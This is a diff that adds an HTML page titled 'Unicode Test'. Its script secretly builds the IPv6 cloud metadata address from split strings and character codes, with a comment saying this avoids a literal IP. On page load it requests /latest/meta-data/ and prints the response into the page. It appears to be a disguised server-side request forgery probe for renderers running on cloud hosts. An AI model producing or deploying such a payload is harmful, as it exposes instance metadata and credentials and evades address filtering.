@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Unicode Test</title></head>
+<body>
+<h1>UNICODE_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+// Use string concat to avoid literal IP
+var parts = ['fd','00',':','ec','2','::','25','4'];
+var ip = parts.join('');
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + "://[" + ip + "]/latest/meta-data/";
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', url, false);
+  xhr.send();
+  document.getElementById('r1').innerText = 'STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,2000);
+} catch(e) {
+  document.getElementById('r1').innerText = 'ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body>
+</html>
